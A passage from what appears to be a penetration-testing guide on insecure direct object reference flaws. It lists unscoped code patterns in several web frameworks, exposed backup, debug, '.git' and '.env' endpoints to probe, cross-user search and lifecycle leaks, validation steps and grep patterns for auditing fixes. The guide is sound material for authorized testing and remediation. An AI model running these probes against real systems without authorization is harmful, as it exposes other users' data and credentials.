- `@PreAuthorize("#dto.userId == authentication.principal.id")` — per-object but relies on the DTO's field being trusted; if the DTO is user-controlled, this is trivially bypassed.
- Repository methods `findById(id)` without a scope-append — IDOR.

### PHP / Laravel

- `middleware('auth')` — auth-only.
- `Order::find($id)` in controllers — IDOR.
- `$request->user()->orders()->find($id)` — scoped.
- Policies (`OrderPolicy@view`) — check each rule.
- **Route-model binding without scope**: `Route::get('/orders/{order}', ...)` — Laravel injects the `Order` model but doesn't scope by owner unless explicitly bound.

### Go

- `router.GET("/orders/:id", authMiddleware, orderHandler)` — auth-only.
- `db.Where("id = ?", id).First(&order)` — no scope; IDOR.
- Middleware chains with `gorilla/mux` or `chi` — each needs review.

### .NET / ASP.NET

- `[Authorize]` attribute alone — auth-only.
- `_context.Orders.FindAsync(id)` — no scope.
- Custom `IAuthorizationRequirement` — check the handler.

## Backup, Log, and Debug Endpoint IDOR

- **Automated backup routes**: `GET /admin/backup`, `POST /admin/backup/restore`, `GET /_admin/dump.sql` — often protected only by an obscure path or basic auth with default credentials. A leaked backup contains every user's data.
- **Log endpoints**: `/logs/{id}`, `/audit-logs/{id}` — logs frequently include user IDs, session cookies, PII in error traces. If per-log-entry authz is missing, cross-user log access.
- **Debug and profiling routes**: `/_debug`, `/actuator`, `/rails/info/routes`, `/nestjs/health`, `/api/v1/debug` — routinely exposed on staging or by default. Some frameworks expose endpoints that dump the current request context, which may include a peer's session in some contexts.
- **Metrics endpoints**: `/metrics` (Prometheus), `/actuator/prometheus` — labels frequently include user IDs, tenant IDs. Enumeration from metric label values.
- **`.git`, `.env`, `.DS_Store`**: not IDOR strictly, but the credentials or session tokens leaked from these enable subsequent IDOR probes.

## Object-Lifecycle Boundary IDOR

- **Soft-deleted objects**: `?include_deleted=1` or `?with_trashed=1` (Laravel's `withTrashed`) — soft-deleted objects are still in the DB; scope may not extend to them.
- **Archived objects**: separate `archived_orders` table with different scoping.
- **Draft objects**: draft state may skip live-scope checks.
- **In-transit / pending state**: a payment or transfer in the "pending" state may be visible cross-user because it hasn't been assigned yet.
- **Deleted-recovery endpoints**: `POST /orders/{id}/restore` — often callable by any authenticated user; probes restore foreign objects.
- **Undo endpoints**: `POST /undo/{ops_id}` — reverse an operation via its ops_id. If ops_ids are enumerable, cross-user undo.

## Search-Result IDOR

- **Full-text search leakage**: an app search that returns matching results across the entire index rather than the caller's scope. Test with a search term you know only exists in a peer's data.
- **Autocomplete/suggest endpoints**: `?q=` autocomplete against a shared index — often unscoped by tenant.
- **Filter-by-owner leakage**: `?owner_id=<foreign>` — some search endpoints accept a filter parameter that is not cross-checked against the caller.
- **Faceted-search count leakage**: facets return counts per category; a facet like `owner: [{name: 'alice', count: 42}, ...]` reveals user identities and their object counts.

## Validation Depth

Beyond the three-clause predicate:

- **Server-side impact proof**: an IDOR that reads is disclosure; an IDOR that writes must be demonstrated with a durable state change. Screenshot the owner's view of their object before and after the attacker's write. For destructive writes, capture the pre-state and confirm the state change survives a session refresh — an app-layer artifact that resets on reload is not a durable finding.
- **Audit-log trace**: some apps log the caller identity per action; the log shows attacker's identity performing action on foreign object. Include the log excerpt as evidence. Where audit-log access is restricted, request it via the engagement's coordinator and note the log entry ID in the report.
- **DB-level verification**: with permission, query the DB directly to show the row's state (owner, updated_at) before and after. This distinguishes app-layer artifacts from true data mutation.
- **Regression scope**: after a fix, re-run the entire two-account probe across every family — a fix that patches Direct Object Reference on the `/orders/{id}` endpoint often misses the Action-Level sibling. The "did the fix generalize?" test is a full family-sweep, not a repeat of the specific reported request.
- **Adjacent-endpoint sweep**: for every confirmed IDOR, the highest-yield follow-up is to probe every sibling endpoint that shares the object type. A confirmed IDOR on `GET /orders/{id}` should trigger probes on `POST /orders/{id}/cancel`, `PATCH /orders/{id}`, `POST /orders/{id}/refund`, `GET /orders/{id}/receipt`, `POST /orders/{id}/share`. Each is a separate finding under a separate family.
- **Fix-verification methodology**: when a fix lands, verify (a) the reported request is now denied, (b) the confirmation-predicate clauses all fail (status non-2xx or identifier mismatch or content mismatch), and (c) an adjacent-endpoint probe still fires the same family. A fix that adds a check in the reported handler alone but not in the shared middleware is a partial fix, and adjacent endpoints regress the class.
- **Non-repudiation of confirmation**: capture the full request/response pairs (including timing, TLS session id where relevant) so the finding can be re-confirmed post-fix by replay. A screenshot alone is not sufficient for high-impact findings.

## Reverse-Engineering Fixed IDOR — Adjacent-Bug Prediction

The most productive audit lens is "what did this fix change, and where else does the same shape live?" When a fix commits an authorization check, the class of the fix predicts the sibling bugs the fix does not cover:

- **A scope filter added to one ORM query**: grep the codebase for the same-shape query pattern in other files. A fix that adds `.filter(user=request.user)` to `OrderView.get_queryset()` predicts the same bug in `InvoiceView.get_queryset()`, `ExportView.get_queryset()`, and every other queryset shape in the codebase that predates the fix.
- **A middleware added to one route**: check every route defined in the same router file. A middleware that wraps `/orders/{id}` but not `/orders/{id}/cancel` is a class-boundary fix — the sibling actions regress the class.
- **A resolver-level auth check added to one GraphQL field**: audit every resolver in the same schema module. Type-level checks may lag field-level.
- **A per-object permission introduced to one policy class**: the sibling policies for related objects likely have the same shape and the same lag.
- **A raw-SQL query rewritten to use the ORM**: any other raw-SQL query in the codebase is a candidate.

Grep patterns that surface classes to sweep after a fix ships:

```
rg -tp 'objects\.get\(pk=' <path>                              # Django unscoped fetch
rg -tp '(current_user|self\.request\.user).*\.filter' <path>   # scoped queryset pattern
rg -tp '\.raw\(|execute\(.*%s' <path>                          # raw-SQL escape hatches
rg -tp '(current_user|request\.user)\.orders\.find'            # scoped Rails/Django lookup
rg -tp 'params\.permit\(.*_id' <path>                          # Rails Strong Params over-permit
```

Every match that lacks a scope-append in the same expression is a candidate. Cross-reference against the fixed-CVE's mechanism to catch the whole family in one pass.

## Rate-of-Change Signals During Engagement

- **Deploy cadence**: apps that deploy frequently frequently regress. If a probed endpoint returns different responses across the engagement window, the endpoint's authz middleware may be actively churning. Timestamp every probe.
- **Feature-flag toggles**: some findings appear only under specific flag configurations. If a flag is toggled during the engagement, retest.
- **Traffic-based rollout**: canary deployments may return different responses per-request based on the rollout bucket. Set a session-affinity cookie or repeat requests to confirm consistency.

## Summary

The advanced IDOR surface is layered differentials: identity dropped or coerced at proxy/gateway/framework/parser/ORM; blind-channel confirmation via existence oracles and timing when body is masked; cache and race primitives that collapse authorization checks against actual mutation; and adversarial two-account probes that survive silent-enforcement and auto-scoping designs. The finding is a differential between what the caller *should* see and what they do — measure both ends, cross-check the three predicate clauses, and confirm chained primitives per hop.
